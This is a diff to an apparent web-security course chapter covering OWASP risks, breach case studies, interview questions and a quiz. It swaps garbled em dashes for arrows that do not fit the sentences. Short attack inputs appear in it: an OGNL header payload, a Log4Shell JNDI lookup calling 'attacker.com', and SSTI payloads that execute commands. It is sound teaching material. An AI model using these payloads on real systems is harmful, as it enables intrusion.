@@ -658,7 +658,7 @@ public String transfer(@RequestParam String _csrf, ...) {
 **Risk:** High | **Complexity:** Low | **OWASP Score:** 6.5
 ## 17. Case Studies: Equifax, GitHub, Facebook, British Airways
 
-### Case Study 1: Equifax 2017 â€” Apache Struts CVE-2017-5638
+### Case Study 1: Equifax 2017 → Apache Struts CVE-2017-5638
 
 **Attack Type:** OGNL Injection via Content-Type header (RCE)
 **Impact:** 147 million records stolen
@@ -666,13 +666,13 @@ public String transfer(@RequestParam String _csrf, ...) {
 #### Full Attack Chain
 
 1. **Reconnaissance:** Attacker identifies Equifax uses Apache Struts 2 with REST plugin
-2. **Vulnerability:** CVE-2017-5638 â€” Struts 2 REST plugin fails to sanitize Content-Type header
-3. **Exploit â€” OGNL Injection:** Attacker sends a crafted Content-Type header containing OGNL expression
+2. **Vulnerability:** CVE-2017-5638 → Struts 2 REST plugin fails to sanitize Content-Type header
+3. **Exploit → OGNL Injection:** Attacker sends a crafted Content-Type header containing OGNL expression
 4. **RCE:** Expression executes, downloads web shell to server
 5. **Persistence:** Web shell deployed to /opt/apache/webapps/shell.jsp
 6. **Lateral Movement:** Internal access used to reach database servers
 7. **Exfiltration:** 147M records (names, SSNs, DOB, addresses) over encrypted channels
-8. **Delay:** Breach undetected for 76 days (no logging/monitoring â€” A09)
+8. **Delay:** Breach undetected for 76 days (no logging/monitoring → A09)
 
 ```http
 # OGNL injection payload in Content-Type header
@@ -690,7 +690,7 @@ Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER
 ### Case Study 2: GitHub DDoS 2018 (Memcrashed)
 
 **Attack Type:** Amplified DDoS via memcached UDP reflection
-**Impact:** 1.35 Tbps DDoS â€” largest at the time
+**Impact:** 1.35 Tbps DDoS → largest at the time
 **Duration:** ~20 minutes
 #### Attack Chain
 
@@ -730,7 +730,7 @@ echo -e "stats\r\n" | nc -u vulnerable-memcached 11211
 - Validate resolved IP, not just domain
 - Use random ephemeral hostnames to prevent DNS rebinding
 - Network segmentation: app tier should not have metadata access
-### Case Study 4: British Airways 2018 â€” Magecart
+### Case Study 4: British Airways 2018 → Magecart
 
 **Attack Type:** Third-party JavaScript skimmer
 **Impact:** 380,000 payment cards stolen
@@ -997,7 +997,7 @@ public ResponseEntity<?> login(@RequestBody LoginRequest req, HttpServletRequest
 
 
 ```html
-<!-- Subresource Integrity â€” browser verifies hash before executing -->
+<!-- Subresource Integrity → browser verifies hash before executing -->
 <script src="https://cdn.example.com/script.js"
         integrity="sha384-oVuMAfCqT81bP+7GX7wF1kCTMGxM+Ewp0f0c4pL3cRz+8XxPpD+WvUo6CqA+Hj"
         crossorigin="anonymous"></script>
@@ -1061,7 +1061,7 @@ public class SecurityLoggingAspect {
 
 
 ```text
-Detection â†’ Analysis â†’ Containment â†’ Eradication â†’ Recovery â†’ Postmortem
+Detection → Analysis → Containment → Eradication → Recovery → Postmortem
 Industry benchmarks:
 - Mean Time to Detect (MTTD): 207 days (IBM 2023)
 - Mean Time to Contain (MTTC): 73 days
@@ -1133,7 +1133,7 @@ Industry benchmarks:
 
 |--------------|--------|
 
-| SSRF | Metadata service â†’ IAM credential theft |
+| SSRF | Metadata service → IAM credential theft |
 
 | Broken Access Control | Cross-account resource access |
 
@@ -1151,7 +1151,7 @@ Industry benchmarks:
 **Answer:** SQL Injection occurs when user input is concatenated into SQL queries as executable code rather than data. An attacker inputs `OR 1=1` to bypass authentication or `UNION SELECT` to extract data. Prevention: always use parameterized queries/prepared statements, apply least-privilege DB permissions, and never concatenate user input into SQL strings.
 ### Q3: What is the difference between Reflected, Stored, and DOM-based XSS?
 
-**Answer:** Reflected XSS: payload comes from the current HTTP request (typically URL), echoed by the server without encoding. Stored XSS: payload stored on the server (database, comment, profile) and served to all visitors â€” most dangerous. DOM-based XSS: vulnerability exists solely in client-side JavaScript â€” server never sees the payload. All three execute in the victim's browser context.
+**Answer:** Reflected XSS: payload comes from the current HTTP request (typically URL), echoed by the server without encoding. Stored XSS: payload stored on the server (database, comment, profile) and served to all visitors → most dangerous. DOM-based XSS: vulnerability exists solely in client-side JavaScript → server never sees the payload. All three execute in the victim's browser context.
 ### Q4: How does Content Security Policy (CSP) prevent XSS?
 
 **Answer:** CSP is an HTTP header that tells the browser which sources are trusted for scripts, styles, images, etc. `script-src 'self'` blocks all inline scripts and external scripts from untrusted origins. With a nonce-based CSP, only script tags with the matching nonce attribute execute. CSP acts as a powerful defense-in-depth layer.
@@ -1172,7 +1172,7 @@ Industry benchmarks:
 **Answer:** CVE-2021-44228 (Log4Shell) is an RCE in Apache Log4j 2.x. When user-controlled data is logged, Log4j processes JNDI lookups like `${jndi:ldap://attacker.com/a}`, loading remote code. Impact: hundreds of millions of devices affected. This highlights OWASP A06 (Vulnerable Components).
 ### Q10: How does HTTPS protect against MITM attacks?
 
-**Answer:** HTTPS uses TLS to provide: (1) Encryption â€” data is encrypted so eavesdroppers cannot read it. (2) Authentication â€” server presents a certificate signed by a trusted CA. (3) Integrity â€” TLS MAC ensures data was not modified in transit.
+**Answer:** HTTPS uses TLS to provide: (1) Encryption → data is encrypted so eavesdroppers cannot read it. (2) Authentication → server presents a certificate signed by a trusted CA. (3) Integrity → TLS MAC ensures data was not modified in transit.
 ### Q11: What is deserialization attack and how does ysoserial work?
 
 **Answer:** Deserialization attacks exploit applications that deserialize untrusted data. Java's ObjectInputStream.readObject() can execute arbitrary code if the serialized data contains a "gadget chain". ysoserial generates these gadget chains for common libraries. Prevention: never deserialize untrusted data, use JSON instead.
@@ -1181,13 +1181,13 @@ Industry benchmarks:
 **Answer:** HTTP Request Smuggling exploits discrepancies between front-end and back-end servers in parsing Content-Length and Transfer-Encoding headers. An attacker crafts an ambiguous request that the front-end interprets as one request but the back-end sees as two. Fix: consistent parsing, reject ambiguous requests, use HTTP/2.
 ### Q13: What is the difference between WAF and RASP?
 
-**Answer:** WAF operates at the network edge, inspecting HTTP requests using signatures. It blocks known attack patterns but can be bypassed. RASP runs inside the application, intercepting actual code execution. It sees parsed, normalized data â€” harder to bypass. RASP blocks both known and unknown attacks but requires agent integration.
+**Answer:** WAF operates at the network edge, inspecting HTTP requests using signatures. It blocks known attack patterns but can be bypassed. RASP runs inside the application, intercepting actual code execution. It sees parsed, normalized data → harder to bypass. RASP blocks both known and unknown attacks but requires agent integration.
 ### Q14: How do you test for SSTI?
 
-**Answer:** Inject template expressions and observe the response. Test: `{{7*7}}` â†’ if response contains "49", SSTI confirmed. For Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. For Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
+**Answer:** Inject template expressions and observe the response. Test: `{{7*7}}` → if response contains "49", SSTI confirmed. For Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`. For Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}`.
 ### Q15: What is a bug bounty program and how do you approach it?
 
-**Answer:** A bug bounty program offers rewards for finding security vulnerabilities. Approach: (1) Recon â€” enumerate subdomains, endpoints, tech stack. (2) Automated scanning â€” run tools with throttle. (3) Manual testing â€” focus on logic flaws. (4) Exploitation â€” prove impact without damage. (5) Report â€” clear, reproducible steps with PoC. Top categories: XSS, IDOR, SSRF.
+**Answer:** A bug bounty program offers rewards for finding security vulnerabilities. Approach: (1) Recon → enumerate subdomains, endpoints, tech stack. (2) Automated scanning → run tools with throttle. (3) Manual testing → focus on logic flaws. (4) Exploitation → prove impact without damage. (5) Report → clear, reproducible steps with PoC. Top categories: XSS, IDOR, SSRF.
 ---
 
 ## 27. Summary
@@ -1212,16 +1212,16 @@ Industry benchmarks:
 
 ### Core Takeaways
 
-- OWASP Top 10 (2021) â€” ten critical web risks ranked by exploitability, prevalence, and impact
-- Injection (A03) â€” separate data from commands with parameterized queries
-- XSS â€” context-aware output encoding + CSP as defense-in-depth
-- CSRF â€” anti-CSRF tokens + SameSite cookies for all state-changing requests
-- SSRF â€” URL allowlists + block internal IP ranges
-- Secure Headers â€” CSP, HSTS, XFO, X-Content-Type-Options create browser-enforced defense layers
-- Deserialization â€” never deserialize untrusted data; use JSON with type validation
-- File Upload â€” validate type, rename files, store outside webroot
-- Bug Bounty â€” recon, exploit, report with clear PoC
-- Case Studies â€” Equifax (unpatched Struts), GitHub (memcached amplification), Facebook (SSRF + DNS rebinding), British Airways (third-party JS skimmer)
+- OWASP Top 10 (2021) → ten critical web risks ranked by exploitability, prevalence, and impact
+- Injection (A03) → separate data from commands with parameterized queries
+- XSS → context-aware output encoding + CSP as defense-in-depth
+- CSRF → anti-CSRF tokens + SameSite cookies for all state-changing requests
+- SSRF → URL allowlists + block internal IP ranges
+- Secure Headers → CSP, HSTS, XFO, X-Content-Type-Options create browser-enforced defense layers
+- Deserialization → never deserialize untrusted data; use JSON with type validation
+- File Upload → validate type, rename files, store outside webroot
+- Bug Bounty → recon, exploit, report with clear PoC
+- Case Studies → Equifax (unpatched Struts), GitHub (memcached amplification), Facebook (SSRF + DNS rebinding), British Airways (third-party JS skimmer)
 ### Attack Comparison Table
 
 | Attack | Root Cause | Standard Prevention | Advanced Prevention |
@@ -1262,10 +1262,10 @@ Design a complete security architecture for an e-commerce application considerin
 ### Chapter Quiz
 
 1. Which OWASP Top 10 (2021) category has the highest exploitability score?
-   - A) A01 â€” Broken Access Control
-   - B) A03 â€” Injection
-   - C) A06 â€” Vulnerable Components
-   - D) A09 â€” Logging & Monitoring
+   - A) A01 → Broken Access Control
+   - B) A03 → Injection
+   - C) A06 → Vulnerable Components
+   - D) A09 → Logging & Monitoring
 2. A JWT token with header `{"alg":"none"}` is vulnerable to:
    - A) SQLi
    - B) Signature bypass
@@ -1288,7 +1288,7 @@ Design a complete security architecture for an e-commerce application considerin
    - D) RASP is always free
 <details>
 <summary>Answers</summary>
-1. B (Injection â€” exploitability: 3, Easy), 2. B, 3. B, 4. C, 5. A
+1. B (Injection → exploitability: 3, Easy), 2. B, 3. B, 4. C, 5. A
 </details>
 ## 6. Server-Side Request Forgery (SSRF)
 
@@ -2677,7 +2677,7 @@ Low                 | Low    | Low    | Medium | Medium
 
 ## 42. Final Review
 
-### OWASP Top 10 (2021) â€” Quick Reference
+### OWASP Top 10 (2021) → Quick Reference
 
 | # | Category | Key Prevention |
 
